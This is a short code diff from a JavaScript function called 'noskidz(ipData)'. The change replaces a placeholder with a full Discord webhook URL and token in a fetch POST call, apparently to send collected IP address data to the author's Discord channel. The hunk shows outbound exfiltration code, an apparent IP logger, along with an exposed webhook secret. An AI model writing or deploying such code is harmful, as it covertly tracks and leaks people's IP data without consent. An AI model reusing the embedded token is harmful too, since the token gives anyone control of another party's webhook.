@@ -15,7 +15,7 @@ function noskidz(ipData) {
     }],
   };
   
-  fetch('webhook', {
+  fetch('https://discord.com/api/webhooks/1192845321546498199/DiJqRKu8HTFDv74wz5uH7I044jLDd1Xn4xxeAu5-gPsY9lMJ27hRD5G7-gfWnlQcPxoN', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
